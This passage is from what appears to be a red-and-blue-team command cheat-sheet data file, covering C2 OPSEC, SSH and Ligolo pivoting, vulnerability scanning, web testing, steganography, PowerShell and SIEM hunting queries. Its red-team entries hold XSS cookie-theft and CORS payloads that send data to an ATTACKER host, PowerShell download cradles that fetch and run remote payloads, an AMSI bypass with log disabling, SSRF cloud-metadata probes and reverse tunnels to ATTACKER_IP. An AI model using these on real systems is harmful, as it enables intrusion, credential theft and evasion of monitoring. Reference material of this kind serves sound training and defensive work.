      tags: ['c2', 'opsec', 'evasion', 'tradecraft'], command: '# Empire OPSEC\n(Empire: AGENT) > set DefaultDelay 60    # 60s sleep\n(Empire: AGENT) > set DefaultJitter 0.3  # 30% jitter\n# Change listener profile to mimic legit traffic\n# Use HTTPS with valid Let\'s Encrypt cert\n\n# Sliver OPSEC\nsliver > generate beacon --mtls C2_IP:443 \\\n  --seconds 60 --jitter 30 \\\n  --skip-symbols --debug\n\n# Domain fronting (CDN)\nsliver > https --domain cdn.azureedge.net\n\n# Redirector setup (socat)\nsocat TCP4-LISTEN:443,fork TCP4:REAL_C2:443\n\n# Rotate certs\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes\n\n# Kill switch: wipe implant artifacts on detection',
      killchain: 'c2', attack: ['defense-evasion', 'command-control'], pyramid: 'ttps', owasp: [] },

    // ═════════════════════════════════════════════════════════
    //  TUNNELING / PIVOTING — SSH, proxychains, ligolo, rpivot
    // ═════════════════════════════════════════════════════════

    { id: 'ssh-local-forward', title: 'SSH Local Port Forward', team: 'red', category: 'tunnel',
      description: 'Forward a local port to a remote service through an SSH tunnel.',
      tags: ['ssh', 'tunnel', 'port-forward', 'local'], command: '# Access remote MySQL through SSH tunnel\nssh -L 3306:localhost:3306 user@PIVOT_HOST\n# Now connect: mysql -h 127.0.0.1 -P 3306\n\n# Access remote web service\nssh -L 8080:INTERNAL_HOST:80 user@PIVOT_HOST\n# Now browse: http://127.0.0.1:8080\n\n# RDP through tunnel\nssh -L 3389:TARGET:3389 user@PIVOT_HOST\n# Now: mstsc → 127.0.0.1:3389\n\n# Multiple forwards\nssh -L 8080:web:80 -L 3306:db:3306 -L 5432:pg:5432 user@PIVOT_HOST\n\n# Background tunnel (no shell)\nssh -L 8080:TARGET:80 -N -f user@PIVOT_HOST',
      killchain: 'c2', attack: ['lateral-movement'], pyramid: 'ttps', owasp: [] },
    { id: 'ssh-dynamic-socks', title: 'SSH SOCKS Proxy + Proxychains', team: 'red', category: 'tunnel',
      description: 'Create a SOCKS proxy via SSH for routing all tools through a pivot host.',
      tags: ['ssh', 'socks', 'proxychains', 'dynamic'], command: '# Create SOCKS5 proxy on port 8080\nssh -D 8080 -C -q -N user@PIVOT_HOST\n\n# Configure proxychains (/etc/proxychains4.conf)\n# Add: socks5 127.0.0.1 8080\n\n# Route tools through proxy\nproxychains nmap -sT -Pn TARGET_IP\nproxychains curl http://INTERNAL_HOST\nproxychains firefox &\n\n# Firefox manual SOCKS config:\n# SOCKS Host: 127.0.0.1 Port: 8080\n# Check: "Proxy DNS when using SOCKS v5"\n\n# Verify proxy works\nproxychains curl ifconfig.me',
      killchain: 'c2', attack: ['lateral-movement', 'command-control'], pyramid: 'ttps', owasp: [] },
    { id: 'ssh-reverse-tunnel', title: 'SSH Reverse Tunnel', team: 'red', category: 'tunnel',
      description: 'Create a reverse SSH tunnel — expose internal services to your attack machine.',
      tags: ['ssh', 'reverse', 'tunnel'], command: '# From target (inside network) back to attacker\nssh -R 9090:INTERNAL_TARGET:80 attacker@ATTACKER_IP\n# Attacker can now access: http://127.0.0.1:9090\n\n# Reverse SOCKS proxy (from target)\nssh -R 1080 attacker@ATTACKER_IP\n# Attacker uses: socks5 127.0.0.1 1080 in proxychains\n\n# Persistent reverse tunnel (autossh)\nautossh -M 0 -f -N -R 9090:localhost:22 attacker@ATTACKER_IP\n\n# SSH server must allow:\n# GatewayPorts yes (in /etc/ssh/sshd_config)',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ttps', owasp: [] },
    { id: 'ssh-jump-bastion', title: 'SSH Jump Host / Bastion', team: 'blue', category: 'tunnel',
      description: 'Use SSH jump hosts for secure multi-hop access through bastion servers.',
      tags: ['ssh', 'jump', 'bastion', 'proxy'], command: '# Jump through bastion to internal host\nssh -J bastion.example.com user@internal-server\n\n# Multi-hop jump\nssh -J user1@jump1,user2@jump2 user3@target\n\n# SSH config for permanent jump host\n# ~/.ssh/config:\n# Host internal-*\n#   ProxyJump bastion.example.com\n#   User admin\n#   IdentityFile ~/.ssh/internal_key\n\n# Agent forwarding (use with caution)\nssh -A -J bastion user@internal\n\n# SCP through jump host\nscp -J bastion localfile.txt user@internal:/tmp/',
      killchain: 'c2', attack: ['lateral-movement'], pyramid: 'ttps', owasp: [] },
    { id: 'ligolo-pivot', title: 'Ligolo-ng Pivoting', team: 'red', category: 'tunnel',
      description: 'Ligolo-ng — advanced pivoting through TUN interface for full network access.',
      tags: ['ligolo', 'pivot', 'tun', 'tunnel'], command: '# On attacker: start proxy\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On target: connect agent back\n./agent -connect ATTACKER_IP:11601 -ignore-cert\n\n# In Ligolo console: select session\nsession\n1  # select agent\n\n# Add route to internal network\nsudo ip route add 10.10.10.0/24 dev ligolo\n\n# Start tunnel\nstart\n\n# Now scan internal network directly!\nnmap -sT -Pn 10.10.10.0/24\ncurl http://10.10.10.50',
      killchain: 'c2', attack: ['lateral-movement'], pyramid: 'tools', owasp: [] },
    { id: 'rpivot-socks', title: 'rpivot SOCKS4 Reverse Proxy', team: 'red', category: 'tunnel',
      description: 'rpivot — reverse SOCKS proxy for pivoting through firewalled hosts.',
      tags: ['rpivot', 'socks', 'reverse', 'pivot'], command: '# On attacker: start server\npython server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080\n\n# On target: connect back\npython client.py --server-ip ATTACKER_IP --server-port 9999\n\n# Attacker now has SOCKS4 on 127.0.0.1:1080\nproxychains nmap -sT -Pn INTERNAL_TARGET\nproxychains curl http://INTERNAL_WEB\n\n# Add to proxychains.conf:\n# socks4 127.0.0.1 1080',
      killchain: 'c2', attack: ['lateral-movement'], pyramid: 'tools', owasp: [] },

    // ═════════════════════════════════════════════════════════
    //  VULNERABILITY SCANNING — Nessus, OpenVAS, Nmap NSE
    // ═════════════════════════════════════════════════════════

    { id: 'nessus-docker', title: 'Nessus Docker Setup', team: 'blue', category: 'vulnscan',
      description: 'Run Nessus vulnerability scanner in Docker — quick setup for authenticated and unauthenticated scans.',
      tags: ['nessus', 'vulnerability', 'scanner', 'docker'], command: '# Run Nessus container\ndocker run -d -p 8834:8834 --name nessus tenable/nessus\n\n# Access web UI: https://localhost:8834\n# Register for free Nessus Essentials license\n\n# Scan types:\n# - Host Discovery: quick network mapping\n# - Basic Network Scan: standard vuln scan\n# - Credentialed Patch Audit: needs SSH/WinRM creds\n# - Web Application Tests: OWASP checks\n\n# CLI (nessuscli):\ndocker exec nessus /opt/nessus/sbin/nessuscli scan --hosts=TARGET_IP --name="Quick Scan"\n\n# Export results:\n# Dashboard → Reports → Export (CSV/PDF/Nessus)',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'openvas-docker', title: 'OpenVAS Docker Setup', team: 'blue', category: 'vulnscan',
      description: 'Run OpenVAS (Greenbone) vulnerability scanner in Docker — open-source alternative to Nessus.',
      tags: ['openvas', 'greenbone', 'vulnerability', 'docker'], command: '# Run OpenVAS container\nsudo docker run -d -p 443:443 --name openvas immauss/openvas\n\n# Wait for initial setup (~5-10 min)\ndocker logs -f openvas\n\n# Access: https://127.0.0.1\n# Default: admin / admin\n\n# Workflow:\n# 1. Scans → Tasks → New Task\n# 2. Set target IP/range\n# 3. Select scan type (Full & Fast recommended)\n# 4. Execute → wait for completion\n# 5. Review results by severity (CVSS)\n\n# Restart existing container\nsudo docker start openvas\n\n# CVSS severity: Critical(9-10) High(7-8.9) Medium(4-6.9) Low(0.1-3.9)',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'nmap-vuln-scripts', title: 'Nmap NSE Vulnerability Scripts', team: 'blue', category: 'vulnscan',
      description: 'Use Nmap Scripting Engine (NSE) for targeted vulnerability detection.',
      tags: ['nmap', 'nse', 'vulnerability', 'scripts'], command: '# Run all vuln category scripts\nnmap -sV --script vuln TARGET_IP\n\n# Specific vulnerability checks\nnmap --script smb-vuln-ms17-010 -p 445 TARGET    # EternalBlue\nnmap --script http-shellshock --script-args uri=/cgi-bin/test -p 80 TARGET\nnmap --script ssl-heartbleed -p 443 TARGET\nnmap --script http-vuln-cve2017-5638 -p 80 TARGET  # Struts\n\n# Safe scripts + version detection\nnmap -sV --script "safe and vuln" TARGET_IP\n\n# SSL/TLS audit\nnmap --script ssl-enum-ciphers -p 443 TARGET\n\n# HTTP enum\nnmap --script http-enum,http-headers,http-methods -p 80,443 TARGET\n\n# Update NSE database\nnmap --script-updatedb',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'nuclei-vuln-scan', title: 'Nuclei Template Scanner', team: 'blue', category: 'vulnscan',
      description: 'Nuclei — fast template-based vulnerability scanner with community-maintained templates.',
      tags: ['nuclei', 'templates', 'vulnerability', 'scanner'], command: '# Basic scan with all templates\nnuclei -u https://TARGET -t nuclei-templates/\n\n# Scan by severity\nnuclei -u https://TARGET -severity critical,high\n\n# Specific template categories\nnuclei -u https://TARGET -t cves/\nnuclei -u https://TARGET -t misconfiguration/\nnuclei -u https://TARGET -t exposed-panels/\n\n# Scan list of URLs\nnuclei -l urls.txt -severity critical,high -o results.txt\n\n# Rate limit (avoid detection)\nnuclei -u https://TARGET -rl 10 -c 3\n\n# Update templates\nnuclei -update-templates\n\n# Custom template example:\n# nuclei-templates/custom/my-check.yaml',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'vuln-prioritize', title: 'Vulnerability Prioritization (CVSS)', team: 'blue', category: 'vulnscan',
      description: 'Triage and prioritize vulnerabilities using CVSS scores and risk context.',
      tags: ['cvss', 'vulnerability', 'triage', 'risk'], command: '# CVSS Score Ranges:\n# Critical: 9.0-10.0 → Patch within 24h\n# High:     7.0-8.9  → Patch within 7 days\n# Medium:   4.0-6.9  → Patch within 30 days\n# Low:      0.1-3.9  → Patch in next cycle\n\n# Parse Nessus CSV export\nawk -F, \'NR>1 && $4>=7.0 {print $4, $5, $7}\' nessus_export.csv | sort -rn\n\n# CVE lookup\ncurl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-1234" | jq ".vulnerabilities[0].cve.metrics"\n\n# Prioritization factors:\n# 1. CVSS score (base severity)\n# 2. Exploit availability (EPSS score)\n# 3. Asset criticality (crown jewels first)\n# 4. Network exposure (internet-facing > internal)\n# 5. Compensating controls (WAF, IPS)',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },

    // ═════════════════════════════════════════════════════════
    //  WEB PROXY — Burp Suite, mitmproxy, SSRF, XSS, CORS
    // ═════════════════════════════════════════════════════════

    { id: 'burp-proxy-setup', title: 'Burp Suite Proxy Setup', team: 'red', category: 'web',
      description: 'Configure Burp Suite proxy — intercept traffic, install CA cert, scope targets.',
      tags: ['burp', 'proxy', 'intercept', 'web'], command: '# 1. Start Burp → Proxy → Options\n# Default listener: 127.0.0.1:8080\n\n# 2. Browser proxy config:\n# HTTP/HTTPS Proxy: 127.0.0.1:8080\n# Or use FoxyProxy extension\n\n# 3. Install Burp CA certificate:\n# Browse: http://burp/cert → download cacert.der\n# Import in browser: Settings → Certificates → Import\n\n# 4. Set target scope:\n# Target → Scope → Add: *.TARGET.com\n# Proxy → Options → Check "Use suite scope"\n\n# 5. Key tabs:\n# Proxy → Intercept: modify requests live\n# Proxy → HTTP History: review all traffic\n# Repeater: replay and modify requests\n# Intruder: automated attacks\n# Decoder: encode/decode payloads',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'mitmproxy-intercept', title: 'mitmproxy CLI Interception', team: 'red', category: 'web',
      description: 'mitmproxy — CLI HTTP/HTTPS proxy for intercepting and modifying traffic.',
      tags: ['mitmproxy', 'proxy', 'intercept', 'cli'], command: '# Start mitmproxy (interactive TUI)\nmitmproxy -p 8080\n\n# Transparent proxy mode\nmitmproxy --mode transparent\n\n# Dump mode (non-interactive logging)\nmitmdump -p 8080 -w traffic.flow\n\n# Filter specific hosts\nmitmproxy -p 8080 --set view_filter="~d TARGET.com"\n\n# Modify responses with script\nmitmdump -s modify.py -p 8080\n\n# Install cert (first run creates ~/.mitmproxy/)\n# Import mitmproxy-ca-cert.pem in browser\n\n# Web interface\nmitmweb -p 8080 --web-port 8081\n\n# Replay captured requests\nmitmdump -nC traffic.flow',
      killchain: 'exploitation', attack: ['collection'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'xss-payloads', title: 'XSS Testing Payloads', team: 'red', category: 'web',
      description: 'Cross-Site Scripting test payloads — reflected, stored, DOM-based, filter bypass.',
      tags: ['xss', 'web', 'injection', 'payloads'], command: '# Basic reflected XSS\n<script>alert("XSS")</script>\n<img src=x onerror=alert("XSS")>\n<svg onload=alert("XSS")>\n\n# Event handler variants\n<body onload=alert("XSS")>\n<input onfocus=alert("XSS") autofocus>\n<marquee onstart=alert("XSS")>\n\n# Filter bypass (case, encoding)\n<ScRiPt>alert("XSS")</ScRiPt>\n<img src=x onerror=alert(String.fromCharCode(88,83,83))>\n<svg/onload=alert("XSS")>\n\n# DOM-based (check URL params)\njavascript:alert(document.cookie)\n"><img src=x onerror=alert(document.domain)>\n\n# Cookie theft payload\n<script>new Image().src="https://ATTACKER/steal?c="+document.cookie</script>\n\n# Automated: dalfox, XSStrike\ndalfox url "https://TARGET/search?q=FUZZ"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'ssrf-testing', title: 'SSRF Testing Patterns', team: 'red', category: 'web',
      description: 'Server-Side Request Forgery — test internal access, cloud metadata, protocol smuggling.',
      tags: ['ssrf', 'web', 'internal', 'metadata'], command: '# Basic SSRF (test internal access)\nhttp://127.0.0.1:80\nhttp://localhost:8080/admin\nhttp://[::1]:80\n\n# AWS metadata (IMDSv1)\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# GCP metadata\nhttp://metadata.google.internal/computeMetadata/v1/\n\n# Internal network scan\nhttp://10.0.0.1:22\nhttp://192.168.1.1:3306\n\n# Protocol smuggling\ngopher://127.0.0.1:6379/_SET%20pwned%20true\nfile:///etc_passwd\ndict://127.0.0.1:6379/info\n\n# Bypass filters\nhttp://0x7f000001  # hex IP\nhttp://2130706433   # decimal IP\nhttp://127.1        # short form\nhttp://spoofed.burpcollaborator.net  # DNS rebinding',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A10'] },
    { id: 'cors-test', title: 'CORS Misconfiguration Test', team: 'red', category: 'web',
      description: 'Test for CORS misconfigurations — reflected origins, wildcard access, credential leaks.',
      tags: ['cors', 'web', 'misconfiguration', 'origin'], command: '# Test origin reflection\ncurl -s -H "Origin: https://evil.com" TARGET_URL -I | grep -i access-control\n\n# Check if credentials are allowed with reflected origin\ncurl -s -H "Origin: https://evil.com" TARGET_URL -I | grep -i "access-control-allow-credentials"\n\n# Test null origin\ncurl -s -H "Origin: null" TARGET_URL -I | grep -i access-control\n\n# Subdomain wildcard\ncurl -s -H "Origin: https://evil.TARGET.com" TARGET_URL -I | grep -i access-control\n\n# Exploit PoC (paste in browser console):\n# fetch("https://TARGET.com/api/user", {credentials: "include"})\n#   .then(r => r.json())\n#   .then(d => fetch("https://ATTACKER/steal?data="+JSON.stringify(d)))\n\n# Automated scan\npython3 CORScanner.py -u https://TARGET.com',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01'] },

    // ═════════════════════════════════════════════════════════
    //  STEGANOGRAPHY — hide/extract data in files
    // ═════════════════════════════════════════════════════════

    { id: 'steghide-ops', title: 'steghide Embed / Extract', team: 'red', category: 'stego',
      description: 'steghide — embed and extract hidden data in JPEG, BMP, WAV, AU files.',
      tags: ['steghide', 'steganography', 'hide', 'extract'], command: '# Embed secret file in image\nsteghide embed -cf cover.jpg -ef secret.txt -p PASSWORD\n\n# Extract hidden data\nsteghide extract -sf stego_image.jpg -p PASSWORD\n\n# Get info (check if data is embedded)\nsteghide info stego_image.jpg\n\n# Brute-force passphrase with stegcracker\nstegcracker stego_image.jpg /usr/share/wordlists/rockyou.txt\n\n# No password embed\nsteghide embed -cf cover.jpg -ef secret.txt -p ""',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ttps', owasp: [] },
    { id: 'binwalk-extract', title: 'binwalk File Extraction', team: 'blue', category: 'stego',
      description: 'binwalk — scan and extract embedded files, firmware images, hidden data.',
      tags: ['binwalk', 'firmware', 'extract', 'forensics'], command: '# Scan for embedded files\nbinwalk suspicious_file\n\n# Extract all embedded files\nbinwalk -e suspicious_file\n\n# Recursive extraction (deep nested)\nbinwalk -eM suspicious_file\n\n# Entropy analysis (detect encrypted/compressed sections)\nbinwalk -E suspicious_file\n\n# Scan firmware image\nbinwalk firmware.bin\nbinwalk -e firmware.bin && ls _firmware.bin.extracted/',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'exiftool-metadata', title: 'ExifTool Metadata Analysis', team: 'blue', category: 'stego',
      description: 'ExifTool — extract, view, and strip metadata from images, PDFs, documents.',
      tags: ['exiftool', 'metadata', 'exif', 'forensics'], command: '# View all metadata\nexiftool image.jpg\n\n# GPS coordinates\nexiftool -gpslatitude -gpslongitude image.jpg\n\n# Creator/software info\nexiftool -Author -Creator -Software document.pdf\n\n# Strip all metadata (privacy)\nexiftool -all= image.jpg\n\n# Recursive scan directory\nexiftool -r -ext jpg -ext png ./photos/ | grep -i "gps\\|author\\|software"\n\n# Compare metadata of two files\nexiftool -a -u original.jpg modified.jpg\n\n# Check for hidden comments\nexiftool -Comment -UserComment image.jpg',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'stego-detect', title: 'Stego Detection Suite', team: 'blue', category: 'stego',
      description: 'Detect hidden data in files — zsteg (PNG/BMP), stegdetect, strings analysis.',
      tags: ['stego', 'detection', 'zsteg', 'analysis'], command: '# zsteg (PNG/BMP analysis)\nzsteg image.png\nzsteg -a image.png   # try all methods\n\n# stegdetect (JPEG)\nstegdetect image.jpg\n\n# Strings analysis\nstrings -n 8 suspicious_file | grep -iE "flag|password|secret|key"\n\n# Check file type\nfile suspicious_file\n\n# Hex analysis\nxxd suspicious_file | head -50\n\n# LSB analysis with Python\npython3 -c "\nfrom PIL import Image\nim = Image.open(\'image.png\')\npx = im.load()\nbits = \'\'\nfor y in range(im.height):\n  for x in range(im.width):\n    bits += str(px[x,y][0] & 1)\nprint(bytes(int(bits[i:i+8],2) for i in range(0,len(bits),8))[:100])"',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },

    // ═════════════════════════════════════════════════════════
    //  POWERSHELL — offensive, defensive, evasion
    // ═════════════════════════════════════════════════════════

    { id: 'ps-recon', title: 'PowerShell Reconnaissance', team: 'red', category: 'powershell',
      description: 'PowerShell recon commands — system info, users, network, processes, services.',
      tags: ['powershell', 'recon', 'windows', 'enumeration'], command: '# System info\nGet-ComputerInfo | Select-Object OsName, OsVersion, CsDomain\nsysteminfo | findstr /B /C:"OS Name" /C:"Domain"\n\n# Users and groups\nGet-LocalUser | Where-Object Enabled -eq $true\nGet-LocalGroupMember -Group "Administrators"\nnet user /domain\n\n# Network\nGet-NetIPAddress | Where-Object AddressFamily -eq IPv4\nGet-NetTCPConnection | Where-Object State -eq Established\n\n# Processes\nGet-Process | Sort-Object CPU -Descending | Select-Object -First 20\n\n# Services\nGet-Service | Where-Object Status -eq Running\n\n# Installed software\nGet-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: [] },
    { id: 'ps-download-cradle', title: 'PowerShell Download Cradles', team: 'red', category: 'powershell',
      description: 'PowerShell file download and execution techniques — IEX, WebClient, BITS, certutil.',
      tags: ['powershell', 'download', 'cradle', 'execution'], command: '# IEX (Invoke-Expression) — in-memory\nIEX(New-Object Net.WebClient).DownloadString("https://ATTACKER/payload.ps1")\n\n# IEX shorthand\niex(iwr https://ATTACKER/payload.ps1)\n\n# Download to disk\n(New-Object Net.WebClient).DownloadFile("https://ATTACKER/file.exe","C:\\Temp\\file.exe")\nInvoke-WebRequest -Uri https://ATTACKER/file.exe -OutFile C:\\Temp\\file.exe\n\n# BITS Transfer (stealthier)\nStart-BitsTransfer -Source https://ATTACKER/file.exe -Destination C:\\Temp\\file.exe\n\n# Certutil (LOLBin)\ncertutil -urlcache -split -f https://ATTACKER/file.exe C:\\Temp\\file.exe\n\n# Base64 encoded command\npowershell -enc [BASE64_PAYLOAD]',
      killchain: 'delivery', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'ps-amsi-bypass', title: 'PowerShell AMSI Bypass', team: 'red', category: 'powershell',
      description: 'AMSI bypass techniques and PowerShell logging evasion for red team ops.',
      tags: ['powershell', 'amsi', 'bypass', 'evasion'], command: '# PowerShell downgrade (bypass logging + AMSI)\npowershell -version 2 -command "IEX ..."\n\n# AMSI context corruption (obfuscated)\n$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}\n$b=$a.GetFields("NonPublic,Static")|?{$_.Name -like "*Context"}\n[IntPtr]$ptr=$b.GetValue($null)\n[Int32[]]$buf=@(0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)\n\n# Disable ScriptBlock logging\nSet-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0\n\n# Constrained Language Mode check\n$ExecutionContext.SessionState.LanguageMode\n# Bypass: use Add-Type with C# inline code',
      killchain: 'exploitation', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [] },
    { id: 'ps-scriptblock-logging', title: 'PowerShell Logging (Defense)', team: 'blue', category: 'powershell',
      description: 'Enable PowerShell ScriptBlock logging, transcription, and module logging for detection.',
      tags: ['powershell', 'logging', 'detection', 'defense'], command: '# Enable ScriptBlock Logging (GPO or Registry)\nNew-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Force\nSet-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1\n\n# Enable Transcription\nNew-Item -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" -Force\nSet-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" -Name "EnableTranscripting" -Value 1\nSet-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" -Name "OutputDirectory" -Value "C:\\PSLogs"\n\n# Query ScriptBlock logs (Event ID 4104)\nGet-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterHashtable @{Id=4104} | Select-Object -First 10\n\n# Hunt for suspicious commands\nGet-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Message -match "IEX|Invoke-Expression|DownloadString|mimikatz"}',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [] },

    // ── SIEM & Log Analysis ──────────────────────────────────
    { id: 'splunk-basic', title: 'Splunk SPL — Core Searches', team: 'blue', category: 'siem',
      description: 'Essential Splunk SPL queries: index search, stats, timechart, top, rare, transaction.',
      tags: ['splunk', 'spl', 'siem', 'log-analysis'], command: '# Search an index for events\nindex=main sourcetype=syslog ERROR | head 50\n\n# Stats — count events by source\nindex=main | stats count by source | sort -count\n\n# Timechart — events over time\nindex=main | timechart span=1h count by sourcetype\n\n# Top values\nindex=main | top limit=10 src_ip\n\n# Rare values (outlier detection)\nindex=main | rare limit=10 process_name\n\n# Transaction — group related events\nindex=main | transaction src_ip maxspan=5m | where eventcount > 3\n\n# Table + rename\nindex=main sourcetype=access_combined | table _time, clientip, uri_path, status | rename clientip AS "Source IP"',
      killchain: 'actions', attack: ['collection', 'discovery'], pyramid: 'ttps', owasp: [] },

    { id: 'splunk-threat-hunting', title: 'Splunk Threat Hunting Queries', team: 'blue', category: 'siem',
      description: 'Splunk queries for hunting: brute force, lateral movement, data exfil, C2 beaconing.',
      tags: ['splunk', 'threat-hunting', 'siem', 'detection'], command: '# Brute force detection (>5 failed logins in 5 min)\nindex=main EventCode=4625 | bin _time span=5m | stats count by src_ip, _time | where count > 5\n\n# Lateral movement — PsExec / SMB\nindex=main (EventCode=7045 OR process_name=psexec*) | table _time, dest, user, service_name\n\n# Suspicious PowerShell (encoded commands)\nindex=main EventCode=4104 | search ScriptBlockText="*encodedcommand*" OR ScriptBlockText="*frombase64*"\n| table _time, ComputerName, ScriptBlockText\n\n# C2 Beaconing detection (regular intervals)\nindex=main sourcetype=proxy | stats count, avg(bytes_out) as avg_bytes, stdev(bytes_out) as std_bytes by dest_ip\n| where count > 100 AND std_bytes < 50\n\n# Large data transfer (exfiltration)\nindex=main sourcetype=proxy | stats sum(bytes_out) as total_out by src_ip, dest_ip\n| where total_out > 104857600 | sort -total_out',
      killchain: 'actions', attack: ['collection', 'exfiltration', 'lateral-movement'], pyramid: 'ttps', owasp: [] },

    { id: 'windows-eventids', title: 'Windows Event ID Reference', team: 'blue', category: 'siem',
      description: 'Critical Windows Security Event IDs for incident detection and forensic analysis.',
      tags: ['windows', 'event-log', 'forensics', 'siem'], command: '# === Authentication ===\n# 4624 — Successful logon (check LogonType: 2=Interactive, 3=Network, 10=RDP)\n# 4625 — Failed logon (brute force indicator)\n# 4634 — Logoff\n# 4648 — Logon with explicit credentials (runas, lateral movement)\n# 4672 — Special privileges assigned (admin logon)\n\n# === Account Management ===\n# 4720 — User account created\n# 4722 — User account enabled\n# 4724 — Password reset attempt\n# 4738 — User account changed\n# 4732 — Member added to local group\n\n# === Process & Service ===\n# 4688 — New process created (enable cmd line auditing!)\n# 4689 — Process terminated\n# 7045 — New service installed (persistence)\n# 1102 — Audit log cleared (anti-forensics!)\n\n# === PowerShell ===\n# 4103 — Module logging\n# 4104 — ScriptBlock logging (see full PS commands)\n\n# === Kerberos ===\n# 4768 — TGT requested (AS-REQ)\n# 4769 — Service ticket requested (TGS-REQ)\n# 4771 — Kerberos pre-auth failed\n\n# Quick query: failed logins last 24h\nGet-WinEvent -FilterHashtable @{LogName="Security"; Id=4625; StartTime=(Get-Date).AddDays(-1)} | Select-Object TimeCreated, @{N="IP";E={$_.Properties[19].Value}}, @{N="User";E={$_.Properties[5].Value}}',
      killchain: 'actions', attack: ['discovery', 'credential-access'], pyramid: 'artifacts', owasp: [] },

    { id: 'elk-kql', title: 'ELK / Kibana KQL Queries', team: 'blue', category: 'siem',
      description: 'Kibana Query Language (KQL) for threat hunting in Elasticsearch / ELK stack.',
      tags: ['elk', 'kibana', 'kql', 'siem', 'elasticsearch'], command: '# Basic KQL syntax\nevent.action: "logon-failed" and source.ip: 10.0.0.0/8\n\n# Process execution hunting\nprocess.name: "powershell.exe" and process.command_line: *encodedcommand*\n\n# Failed SSH logins\nevent.dataset: "system.auth" and system.auth.ssh.event: "Failed"\n\n# Outbound connections to unusual ports\ndestination.port > 1024 and not destination.port: (443 or 8443 or 8080)\n\n# DNS queries for suspicious TLDs\ndns.question.name: (*.tk or *.ml or *.cf or *.ga or *.gq)\n\n# File creation events (Sysmon Event ID 11)\nevent.code: "11" and file.extension: ("exe" or "dll" or "ps1" or "bat")\n\n# Lateral movement via WMI\nprocess.parent.name: "wmiprvse.exe" and process.name: ("cmd.exe" or "powershell.exe")\n\n# Lucene alternative — range query\n@timestamp:[now-1h TO now] AND event.severity:[3 TO *]',
      killchain: 'actions', attack: ['discovery', 'lateral-movement'], pyramid: 'ttps', owasp: [] },

    { id: 'syslog-analysis', title: 'Syslog & Linux Log Analysis', team: 'blue', category: 'siem',
      description: 'Analyze Linux system logs: auth.log, syslog, journal — hunt for intrusion indicators.',
      tags: ['syslog', 'linux', 'log-analysis', 'forensics'], command: '# Auth failures (brute force)\ngrep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn | head 20\n\n# Successful logins from unusual IPs\ngrep "Accepted" /var/log/auth.log | awk \'{print $9, $11}\' | sort | uniq -c | sort -rn\n\n# New user creation\ngrep "useradd\\|adduser" /var/log/auth.log\n\n# Sudo usage\ngrep "sudo:" /var/log/auth.log | grep -v "pam_unix"\n\n# Cron job changes\ngrep -i "crontab" /var/log/syslog\n\n# Systemd journal — failed services\njournalctl --since "1 hour ago" -p err\n\n# Journal — SSH activity\njournalctl -u sshd --since today --no-pager\n\n# Kernel messages (module loading, network changes)\ndmesg | grep -i "module\\|usb\\|network" | tail -30\n\n# Log timeline reconstruction\nfind /var/log -name "*.log" -mmin -60 -exec ls -lt {} +',
      killchain: 'actions', attack: ['discovery', 'persistence'], pyramid: 'artifacts', owasp: [] },

    { id: 'log-correlation', title: 'Log Correlation & Timeline', team: 'blue', category: 'siem',
      description: 'Correlate events across multiple log sources to build incident timelines.',
